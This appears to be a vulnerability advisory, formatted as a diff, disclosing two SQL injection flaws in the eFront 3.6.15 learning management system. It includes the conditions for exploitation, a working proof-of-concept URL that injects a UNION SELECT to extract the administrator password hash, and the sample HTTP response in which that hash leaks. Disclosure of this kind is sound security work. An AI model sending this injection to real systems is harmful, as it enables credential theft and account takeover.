@@ -1,0 +1,64 @@
+eFront 3.6.15 Multiple SQL Injection Vulnerabilities
+
+[+] Author: Filippo Roncari | Luca De Fulgentis
+[+] Target: eFront 
+[+] Version: 3.6.15 and probably lower
+[+] Vendor: www.efrontlearning.net
+[+] Accessibility: Remote
+[+] Severity: High
+[+] CVE: <requested>
+[+] Full Advisory: https://www.securenetwork.it/docs/advisory/SN-15-02_eFront.pdf
+[+] Info: f.roncari@securenetwork.it 
+
+
+[+] Summary
+eFront is an open source Learning Management System (LMS) used to create and manage online training courses. From Wikipedia: “eFront is designed to assist with the creation of online learning communities while offering various opportunities for collaboration and interaction through an icon-based user interface. The platform offers tools for content creation, tests building, assignments management, reporting, internal messaging, forum, chat, surveys, calendar and others”. 
+
+
+[+] Vulnerability Details
+The new_sidebar.php module, which handles the left side bar in eFront 3.6.15 default theme, is affected by two SQL injection vulnerabilities due to lack of user input sanitization. The identified issues allow unprivileged users, such as professors and students (under certain conditions), to inject arbitrary SQL statements. An attacker could exploit the vulnerabilities by sending specially crafted requests to the web application. These issues can lead to data theft, data disruption, account violation and other impacts depending on the DBMS’s user privileges.
+
+
+[+] Technical Details
+View full advisory at https://www.securenetwork.it/docs/advisory/SN-15-02_eFront.pdf for technical details and source code.
+
+
+[+] Proof of Concept (PoC)
+Any unprivileged authenticated user (e.g., student or professor) can exploit this issue, taking into account that:
+1. An attacker has to access a lesson (= click on any open lesson) before executing the malicious request.
+2. If logged as a Student, a potential attacker has to access a lesson for which his User Type has “content” set to hidden. 
+3. The default theme, or others that use the sidebar, must be in use.
+
+	[!] PoC URL
+	-----------------------------
+	http://target.site/www/new_sidebar.php?sbctg=lessons&new_lesson_id=null+union+select+password+from+users+where+id=1 
+	-----------------------------
+
+The administrator password hash is returned directly in the HTML body as part of the forum link in the sidebar menu.
+
+	[!] HTTP Response
+	-----------------------------
+	HTTP/1.1 200 OK
+	Date: Thu, 09 Apr 2015 22:42:19 GMT Expires: Mon, 26 Jul 1997 05:00:00 GMT Content-Type: text/html
+	Content-Length: 28786
+
+	[...]
+	<div class = "menuOption" name="lessonSpecific" id="forum_a" > <table>
+	<tr> <td>
+	target="mainframe">
+	<a href = "professor.php?ctg=forum&forum=11ff89cb38b258fb50fe8672c18ff79b"
+	<img src='themes/default/images/others/transparent.gif' class = 'handle sprite16 sprite16-message' > </a>
+	</td>
+	<td class = "menuListOption" >
+	<a href = "professor.php?ctg=forum&forum=11ff89cb38b258fb50fe8672c18ff79b" title="Forum" target="mainframe">Forum</a>
+	</td> </tr>
+	</table> </div>
+	[...]
+	-----------------------------
+
+
+For further details and explanations check the full advisory.	
+
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this alert, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author.
